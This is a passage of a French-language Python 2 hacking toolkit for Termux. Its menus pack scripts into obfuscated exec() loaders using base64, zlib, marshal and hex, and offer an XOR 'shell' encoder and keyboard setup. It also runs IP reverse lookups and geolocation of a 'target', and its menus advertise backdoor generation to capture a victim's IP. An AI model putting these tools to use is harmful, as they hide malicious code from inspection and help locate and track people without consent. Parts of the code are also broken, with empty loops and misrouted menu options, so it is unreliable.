        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_Faxel_cryptage()
####################################################################################################
def Cryptage_join():
   cls()  
   charge()
   cls()
   print(logo6)
   script_Join = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
   print("\033[1;97m║")
   resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")        
   ouverture = open(script_Join).read()
   mael = []
   faxel = []
   for x in ouverture:
       mael.append(ord(x))
   for a in mael:
       faxel.append('f' * a)
   compression = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\nd={}\n\nexec("".join([chr(len(i)) for i in d]))'.format(faxel)
   enregistrement = open(resultat, 'w')
   enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n"+ compression)
   enregistrement.close()
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage reussi")
   raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_Faxel_cryptage() 
####################################################################################################
def Cryptage_Bin_Base_Join():
	    cls()  
            charge()
            cls()
            print(logo6)
	    script_Hex = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	    print("\033[1;97m║")
            resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m") 
            ouverture_1 = open(script_Hex).read()  
            encode_base_32 = base64.b32encode(ouverture_1)
            a = []
            b = []
            c = []
            d = ''
            e = ''
            for x in encode_base_32:
                a.append(ord(x))
            z = 0
            while True:
                if z >= len(a) / 2:
                    break
                z += 1
            v = len(a) / 2 + 1
            try:
                while True:
                    v += 1
            except IndexError:
                pass
            for s in c:
                d += chr(s)
            e += bin(int(binascii.hexlify(d), 16))
            sauve_1 = open(resultat, 'w')
            sauve_1.write('import binascii,base64\ng = ' + str(b) + "\ns = '" + str(e) + "'" + "\neval(compile(base64.b32decode(''.join([chr(i) for i in g])+binascii.unhexlify('%x' % int(s, 2))),'<faxel>','exec'))")
            sauve_1.close()
            py_compile.compile(resultat)
            ouverture2 = open(resultat + 'Mr').read()
            sauve_2 = open(resultat, 'w')
            sauve_2.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport binascii, base64\n#REMARQUE : NE PAS MODIFIER SINON TOT OU TARD IL Y AURA UNE ERREUR FREQUENTE.\n\n" + ouverture2)
            sauve_2.close()	
	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    menu_Faxel_cryptage()
####################################################################################################	
####################################################################################################
def menu_error_mz_fzxyl():
     cls()
     print(logo5)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;241m Error Zlim            \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Error Mars Zlim       \033[1;97m   ║")      
     print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Error Shell Mars      \033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Error Join Ordina     \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu General          \033[1;97m   ║") 
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_error()
def choix_error():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_error_mz_fzxyl()
    elif dmd =="1":
        error_zlim()
    elif dmd =="2":
        error_marzli() 
    elif dmd =="3":
        shell_mars() 
    elif dmd =="4":
        Join_ord()   
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_error_mz_fzxyl()
####################################################################################################		
def error_zlim():
	cls()  
        charge()
        cls()
        print(logo5)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_error_mz_fzxyl()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = base64.b16encode(mc.dumps(compile(lecture, '<string>', 'exec')))
		compresse = zlib.compress(compression)
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b16decode(' + repr(compresse) + '))))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_error_mz_fzxyl()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_error_mz_fzxyl()
####################################################################################################
def error_marzli():
	cls()  
        charge()
        cls()
        print(logo5)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_error_mz_fzxyl()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = base64.b16encode(mc.dumps(compile(lecture, '<string>', 'exec')))
		compresse = zlib.compress(compression)
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(' + repr(compresse) + ')))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_error_mz_fzxyl()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_error_mz_fzxyl()
#################################################################################################### 
def shell_mars():
     cls()
     load("\033[1;97mChargement\033[1;93m...")
     cls()
     print(logo1)
     Texte = raw_input('\033[1;97m╚═\033[1;31m▶ \033[1;95mSaisissez votre texte\033[1;91m \n\t\033[1;97m ') 	    
     coder1 = ""
     coder2 = ""
     print ('Nombre de caractere de mot saisi: %d' % len(bytearray(Texte)))
     print ('Codage en Shell.......')
     time.sleep(2)
     i = 11
     for x in bytearray(Texte) :
	     if  i == 16:
		     i = 11
	     y = x^i
	     coder1 += '\\x'
	     coder1 += '%02x' % y
	     coder2 += '0x'
	     coder2 += '%02x,' %y	
	     i = i + 0x01	
     print (coder1)
     print (coder2)
     print ('Nombre de caractere en shell avec la methode simple  : %d' % len(bytearray(coder1)))
     print ('Nombre de caractere en shell avec la methode complexe: %d' % len(bytearray(coder2)))
     raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
     menu_error_mz_fzxyl() 
####################################################################################################	
def Join_ord():
    cls()
    load("\033[1;97mSi vous utilser se ce Join, vous ne pourriez pas le lancer. Merci\033[1;93m...")
    cls()
    print(logo)
    script = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
    print("\033[1;97m║")
    resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")    
    lecture = open(script).read()
    compresse =("\\x" + "\\x".join("{0:x}".format(ord(lecture)) for lecture in lecture))
    save = open(resultat, 'w')
    save.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport base64\nexec('" + compresse + "')")
    save.close()
    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
    menu_error_mz_fzxyl()
    #print("\n♠♠♠♠♠♠♠♠ logo_term_key shellcode =('" + compresse + "'); exec(shellcode)")
####################################################################################################
####################################################################################################
def menu_clavier():	
           cls()
	   print(logo_menu_clavier)
	   print("\033[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
	   print("\033[1;97m╔"+29*"═"+1*"═╗")
	   print("\033[1;97m║\033[1;91m--> \033[1;92m1. \033[38;5;245m Clavier simple        \033[1;97m║")
	   print("\033[1;97m║\033[1;91m--> \033[1;92m2. \033[38;5;214m Clavier semi-complet  \033[1;97m║")
	   print("\033[1;97m║\033[1;91m--> \033[1;92m3. \033[38;5;112m Clavier complet       \033[1;97m║")
	   print("\033[1;97m║\033[1;91m--> \033[1;92mM. \033[38;5;115m Retour au menu        \033[1;97m║" ) 
	   print("\033[1;97m╚"+29*"═"+1*"═╝")
	   print("\x1b[1;97m║")
           choix_clavier()	   
def choix_clavier():	
	dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;31m▶▶▶  \033[1;33m")
	if dmd =="":
		print("\033[1;91m[\033[1;93m!\033[1;91m]\033[1;91m Mauvaise entree\033[1;91m!")
		menu_clavier()
	elif dmd =="1" or dmd =="01":
		clavier_simple()	
	elif dmd =="2" or dmd =="02":		
		clavier_semi_complet()	
	elif dmd =="3" or dmd =="03":			
		clavier_complet()
        elif dmd =="m" or dmd =="M":		
		menu()		
	else:
		print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + dmd + ' \x1b[1;91mindisponible')
	        menu_clavier()
####################################################################################################
def clavier_simple():
	cls()
        print(key_simple)
        print(50 * '\033[1;97m\xe2\x95\x90')
        load("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;97m Début du processus ....")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m Création d\'un repertoire de propriétés termux..\n")
        try:
              os.mkdir('/data/data/com.termux/files/home/.termux')
        except:
              pass
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Réussie !")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Création du fichier d\'installation..")
        Faxel = "extra-keys = [['F1','F2','F3','F4','F5','F6','F12'],['ESC','TAB','CTRL','_','-','DOWN','UP']]"
        ouvert = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
        ouvert.write(Faxel)
        ouvert.close()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Installation de clavier simple réussie \033[1;97m !")
        sleep(1.5)
        print("\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Mise en place de clavier simple..")
        os.system('termux-reload-settings')
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Mise en place de clavier simple réussie \033[1;97m !! ")
        print(50 * '\033[1;97m\xe2\x95\x90')
        print("[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
        raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')
        menuclavier()	
####################################################################################################
def clavier_semi_complet():
	cls()
        print(key_semi)
        print(50 * '\033[1;97m\xe2\x95\x90')
        load("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;97m Début du processus ....")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m Création d\'un repertoire de propriétés termux..\n")
        try:
              os.mkdir('/data/data/com.termux/files/home/.termux')
        except:
              pass
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Réussie !")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Création du fichier d\'installation..")
        Mael = "extra-keys = [['ESC','/','-','HOME','UP','ENTER'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','DEL'],['END','<>',':','//','&&','\']]"
        ouvert = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
        ouvert.write(Mael)
        ouvert.close()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Installation du clavier semi-complet réussie \033[1;91m!\n")
        sleep(1.5)
        print("\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Mise en place..")
        os.system('termux-reload-settings')
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Mise en place du clavier semi-complet réussie \033[1;91m!\n")
        print(50 * '\033[1;97m\xe2\x95\x90')
        mael("\n            \033[1;92m Information utile sur clavier semi-complet\n")
        mael("\033[1;93m«\033[1;94m&&\033[1;93m» \033[1;91m→\033[1;97m Traduit un et entre plusieurs mots")
        mael("\033[1;93m«\033[1;94m<>\033[1;93m» \033[1;91m→\033[1;97m Lorsqu'une phrase est longue, se symbole permet un retour a la ligne")
        print(50 * '\033[1;97m\xe2\x95\x90')
        print("\n\033[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
        raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')
        menu_clavier()	
####################################################################################################
def clavier_complet():
	cls()
        print(key_complet)
        print(50 * '\033[1;97m\xe2\x95\x90')
        load("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;97m Début du processus ....")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;92m Création d\'un repertoire de propriétés termux..\n")
        try:
              os.mkdir('/data/data/com.termux/files/home/.termux')
        except:
              pass
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Réussie!")
        load("\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Création du fichier d'installation..")
        clavier = "extra-keys = [['ESC','HOME','-','UP','ALT','END','BKSP'],['TAB','|','LEFT','CTRL','RIGHT','PGDN','ENTER'],['//',':','\','DOWN','/','_','DEL']]"
        ouvert = open('/data/data/com.termux/files/home/.termux/termux.properties','w')
        ouvert.write(clavier)
        ouvert.close()
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Installation du clavier complet réussie\033[1;91m!")
        sleep(1.5)
        print("\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Mise en place du clavier complet")
        os.system('termux-reload-settings')
        print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Mise en place du clavier complet réussie\033[1;91m!")
        print(50 * '\033[1;97m\xe2\x95\x90')
        mael("\n            \033[1;92m Information utile sur clavier complet\n")
        mael("\033[1;93m«\033[1;94mPGDN\033[1;93m» \033[1;91m→\033[1;97m Symbole environ")
        mael("\033[1;93m«\033[1;94mESC \033[1;93m» \033[1;91m→\033[1;97m Sortie")
        print(50 * '\033[1;97m\xe2\x95\x90')
        print("\n\033[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
        raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')
        menu_clavier()		
####################################################################################################
####################################################################################################
############################        🄼🄴🄽🅄 🄰🅄🅃🅁🄴🅂 🅂🄲🅁🄸🄿🅃🅂        ################################
####################################################################################################
####################################################################################################
def Menu_autres_scripts():
	print("\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●")             
        print("\033[38;5;214m•_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _• ")
        print("\033[38;5;214m•|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ • ")
        print("\033[38;5;214m•|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_• ")    
	print("\033[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●\n")
	print("\033[1;31m  [\033[1;37m++\033[1;31m]\033[1;37m Codé par\033[1;31m : \033[38;5;245m Mr \033[38;5;221mFaxel\033[1;31m [\033[1;37m++\033[1;31m]\n")
	print("\033[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
	print("\033[1;97m╔"+27*"═"+1*"═╗")
	print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;136m Menu Ip-Track    \033[1;97m     ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;115m Menu Ip-Tracer   \033[1;97m     ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;141m Robot Force pas  \033[1;97m     ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;245m Auteur           \033[1;97m     ║") 
	print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;247m Menu General     \033[1;97m     ║") 
	print("\033[1;97m║ \033[1;91m[\033[1;96mQ.\033[1;91m]\033[38;5;125m Quitter          \033[1;97m     ║")
	print("\033[1;97m╚"+27*"═"+1*"═╝")   
	print("\033[1;97m║")
	choix_autres_scripts()
def choix_autres_scripts():
        choisir=raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;31m▶▶▶ \033[1;33m")	
        if choisir ==" ":
                print("\033[1;91m[\033[1;93m!\033[1;91m]\033[1;94m Remplissez correctement\033[1;91m!")
                Menu_autres_scripts()	
        elif choisir =="1":
        	menu_ip()		
        elif choisir =="2":
        	menu_ipt()
        elif choisir =="3":
        	menu_ipt()
        elif choisir =="4":
        	menu_ipt()
        elif choisir =="m" or choisir =="M":
        	menu_ipt()
        elif choisir =="q" or choisir =="Q":
        	menu_ipt()
        else: 
                print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+choisir+' \x1b[1;91mindisponible')
                raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                Menu_autres_scripts()	
####################################################################################################
####################################################################################################
def menu_ip():	
	cls()
	print(logomenu_ip)
	print("[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮")
	print("\033[1;31m  [\033[1;37m++\033[1;31m]\033[1;37m Codé par\033[1;31m :[48;5;0;38;5;158m Mr[38;5;212m Hacker_K\033[1;31m [\033[1;37m++\033[1;31m]\n")
	print("\033[1;97m╔"+61*"═"+1*"═╗")
	print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m][48;5;0;38;5;197m Hôte d\'ecoulement de masse vers IP avec Web liste.\033[1;97m      ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m][48;5;0;38;5;158m IP unique\033[1;91m/[48;5;0;38;5;158mnom d\'hôte.\033[1;97m                                   ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m][38;5;114m Vérifier mon adresse IP publique.\033[1;97m                       ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m][38;5;74m Generer des portes derobées Py pour obtenir l\'adresse \033[1;97m, ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m↪️.\033[1;91m][38;5;74m IP de la victime publique.\033[1;97m                              ║") 
	print("\033[1;97m║ \033[1;91m[\033[1;96m5.\033[1;91m][38;5;210m Emplacement de vidage à partir de l\'adresse IP publique.\033[1;97m║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m6.\033[1;91m][48;5;0;38;5;198m Liens de page d\'extraction en masse à partir de l\'hôte.\033[1;97m ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m7.\033[1;91m][38;5;118m Menu pirate\033[1;97m.                                            ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m8.\033[1;91m][38;5;117m Auteur\033[1;97m.                                                 ║")
	print("\033[1;97m║ \033[1;91m[\033[1;96m0.\033[1;91m][38;5;199m Retour au menu general\033[1;97m.                                 ║")
	print("\033[1;97m╚"+61*"═"+1*"═╝")   
	print("\033[1;97m║")
	choisir_ip()      		
def choisir_ip():	
	choisir=raw_input("\033[1;97m╚═\033[1;31m▶[38;5;245m Mr [38;5;221mFaxel \033[1;31m▶▶▶  \033[1;33m")
	if "1" in choisir:
		
		os.system('clear')
		print(logomenu_ip)
		hote=raw_input(B+R+'  [+] '+J+' WEB LISTE  \033[1;31m▶▶▶ \033[1;37m ')
		try:
			word=open(hote).readlines()
			resultats=len(word)
			print B+A+"  [*] "+B+R+str(resultats)+B+" Hote charger!"
			print B+A+"  [*] "+B+"Vidage IP de "+B+R+hote+" "+B+"...\n"
			ww=open(hote)
			for moi in range(resultats):
				wordliste=ww.readline().replace('\n','')
				try:
					mael=requests.get('http://ip-api.com/json/'+wordliste+'')
					ant=json.loads(mael.text)
					try:
						print B+R+"  [+] "+B+wordliste+R+" ●═══════════◄► "+B+"",ant["query"]
					except:
						print B+R+"  [-] "+wordliste+" ●═══════════◄► Inconnu!"
				except:
					print B+R+"  [-] Verifier votre connexion!"
					raw_input(B+R+'  [+] '+b+'Appuyer entrer pour retourner au menu...')
					os.system('clear')
					menu_ip()
			print B+B+"\n  [*] "+B+"Terminer."
			raw_input(B+R+'  [+] '+B+'Appuyer entrer pour retourner au menu...')
			os.system('clear')
			menu_ip()
		except:
			print B+R+"  [-] Oh merde! Liste '"+hote+"'non trouver."
			raw_input('  [+] '+B+'Appuyer entrer pour retourner au menu...')
			os.system('clear')
			menu_ip()		
	elif "2" in choisir:
		os.system('clear')
		print(logomenu_ip)
		cible=raw_input(B+R+'  [+] '+J+'IP cible\033[1;31m/\033[1;34mNom de l\'hote \033[1;31m ▶▶▶ \033[1;37m  ')
		print("")  
		print"[38;5;214m🇨🇮\033[1;97m I'm the person whom you can never judge. \033[1;92m 🇨🇮"
		print("\033[1;97m╔"+50*"═"+1*"═╗")
		print "\033[1;97m║             \033[1;91m[\033[1;96m Hote de \033[1;92m"+cible+"\033[1;91m] \033[1;97m                         ║"
		print "\033[1;97m║						     \033[1;97m║"
		print "\033[1;97m║\033[1;91m[\033[1;96m1.\033[1;91m]\033[1;97m Obtenez Ip de \033[1;92m"+cible+"      \033[1;97m               ║"
		print "\033[1;97m║\033[1;91m[\033[1;96m2.\033[1;91m]\033[1;97m Obtenez l\'hôte + IP de \033[1;92m"+cible+"   \033[1;97m        ║"
		print "\033[1;97m║\033[1;91m[\033[1;96m3.\033[1;91m]\033[1;97m Obtenez l\'hôte + IP + LOCATION de \033[1;92m"+cible+"\033[1;97m║"
		print "\033[1;97m║						     \033[1;97m║"
		print("\033[1;97m╚"+50*"═"+1*"═╝")
		print "\033[1;97m║"
		choix=raw_input("\033[1;97m╚═\033[1;31m▶[38;5;245m Mr [38;5;221mFaxel \033[1;31m▶▶▶  \033[1;33m")
		if "1" in choix:
			os.system('clear')
		        print(logohote)
			print B+A+"  [*] "+B+"Obtenez Ip de "+B+R+cible+" ...\n"
			try:
				print R+"  [+]"+B+" IP :"+B+V+"", requests.get('http://ip-api.com/json/'+cible+'').json()["query"]
			except:
				print B+R+"\n  [-] Verifier votre connexion internet!"
				raw_input('  [+]'+B+' Appuyer entrer pour retourner au menu...')
				os.system('clear')
				menu_ip()
			print B+A+"\n  [*] "+B+"Terminer."
			raw_input(R+'  [+] '+B+'Appuyer entrer pour retourner au menu...')
			os.system('clear')
			menu_ip()
		elif "2" in choix:
		        os.system('clear')
		        print(logohote)
			print B+A+"  [*] "+B+"Obtenez l\'hôte + IP de "+R+cible+" ..."
			rr=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+cible+'')
			if "error" in rr.text:
				print B+R+"  [-] "+B+"Hote => "+R+"Inconnu!"
				print B+R+"  [-] "+P+"Veuillez entrer l\'hôte sans http ou https"
				print B+A+"  [*] "+J+"Exemple \033[1;91m: "+B+"google.com"
				print B+A+"  [*] "+V+"A plus Man."
				raw_input(R+'  [+]'+B+' Appuyer entrer pour retourner au menu...')
				os.system('clear')
				menu_ip()
			else:
				print B+A+"  [*] "+B+"Enregistrement du resultat de l\'hôte depuis "+R+cible+" ..."
				nom='inverser_de_'+cible+'.txt'
				try:
					os.mkdir('reverse')
					nomfichier=open('reverse/'+nom+'','w')
				except:
					nomfichier=open('reverse/'+nom+'','w')
				nomfichier.write(rr.text)
				nomfichier.close()
				print B+A+"  [*]"+B+" Enregistrer dsous\033[1;91m :"+V+"",nom
				print 
				print B+A+"  [*]"+B+" Vidage IP de la liste"+V+"",nom
				ouvert=open('reverse/'+nom).readlines()
				total=len(ouvert)
				print B+A+"  [*] "+R+str(total)+A+" Hote charger depuis"+R+"",nom
				print("")
				suite=open('reverse/'+nom)
				for moi in range(total):
					list=suite.readline().replace('\n','')
					req=requests.get('http://ip-api.com/json/'+list+'')
					mael=json.loads(req.text)
					try:
						print B+R+"  [+]"+B+" http://"+list+R+" ●═══════════◄►"+B+"",mael["query"]
					except:
						print B+R+"  [-] http://"+list+" ●═══════════◄► Inconnu!"
				print B+R+"\n  [*] "+P+"Terminer."
				print B+R+"  [*] "+B+"Resultat de l\'hôte enregistrer dans => "+R+"/reverse/"+nom
				print B+R+"  [*]"+A+" A plus Man."
				raw_input(R+'  [+]'+B+' Appuyer entrer pour retourner au menu...')
				os.system('clear')
				menu_ip()
				
		elif "3" in choix:
			os.system('clear')
		        print(logohote)
			print B+A+"  [*]"+B+" Obtenir l\'hôte de "+R+cible+" ..."
			rock=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+cible+'')
			if "error" in rock.text:
				print B+R+"  [-] "+B+"Hote ●══◄► "+R+"Inconnu!"
				print B+R+"  [-] "+J+"Veuillez entrer l\'hôte sans http ou https"
				print B+A+"  [*] "+P+"Exemple\033[1;91m : "+B+"google.com"
				print B+A+"  [*] "+B+"A plus Man."
				raw_input(R+'  [+]'+B+' Appuyer entrer pour retourner au menu...')
				os.system('clear')
				menu_ip()
			else:
				cpt=open('lock.txt','w')
				cpt.write(rock.text)
				cpt.close()
				print B+A+"  [*]"+B+" Attaquer!"
				print B+A+"\n  [*]"+B+" Obtenir l\'hôte + IP + LOCATION à partir de "+R+cible+" ..."
				nat=open('lock.txt').readlines()
				h=len(nat)
				print B+A+"  [*] "+B+R+str(h)+B+" Hote charger!\n"
				cap=open('lock.txt')
				for moi in range(h):
					w=cap.readline().replace('\n','')
					try:
						moi=requests.get('http://ip-api.com/json/'+w+'')
						if "No" in moi.text:
							print B+R+"  [-] "+B+"Hote ●═◄►"+R+" Inconnu!"
							print B+R+"  [-]"+P+" Veuillez entrer l\'hôte sans http ou https"
							print B+A+"  [*]"+J+" Exemple\033[1;91m :"+V+" facebook.com"
							print B+A+"  [*]"+B+" A plus Man."
							raw_input(R+'  [+]'+B+' Appuyer entrer pour retourner au menu...')
							os.system('rm -rf hote+lock')
							os.system('clear')
							menu_ip()
						else:
							p=json.loads(moi.text)
							rk=requests.get('http://ipapi.co/'+p["query"]+'/json/')
							r=json.loads(rk.text)
							try:
								lines="══"*30
								print "\033[1;92m  "+lines
								print("\033[1;97m╔"+35*"═"+1*"═╗")
								print B+R+"\n  [+]"+B+" Hote\033[1;97m :"+R+" http://"+w
								print B+A+"\n  [*]"+B+" Adresse IP\t:"+R+"",r["ip"]
								print B+A+"  [*] "+B+"Ville\t\t:"+R+"",r["city"]
								print B+A+"  [*] "+B+"Code Region\t:"+R+"",r["region_code"]
								print B+A+"  [*]"+B+" Pays\t\t:"+R+"",r["country"]
								print B+A+"  [*]"+B+" Nom du pays\t:"+R+"",r["country_name"]
								print B+A+"  [*]"+B+" Region\t\t:"+R+"",r["region"]
								print B+A+"  [*] "+B+"Langue\t\t:"+R+"",r["languages"]
								print B+A+"  [*]"+B+" Code d\'appel\t:"+R+"",r["country_calling_code"]
								print B+A+"  [*]"+B+" Decalage Horaire\t:"+R+"",r["utc_offset"]
								print B+A+"  [*]"+B+" Code Continental\t:"+R+"",r["continent_code"]
								print B+A+"  [*]"+B+" Devise\t\t:"+R+"",r["currency"]
								print B+A+"  [*]"+B+" Latitude\t\t:"+R+"",r["latitude"]
								print B+A+"  [*]"+B+" Longitude\t\t:"+R+"",r["longitude"]
								print B+A+"  [*]"+B+" Heure locale       :"+R+"",r["timezone"]
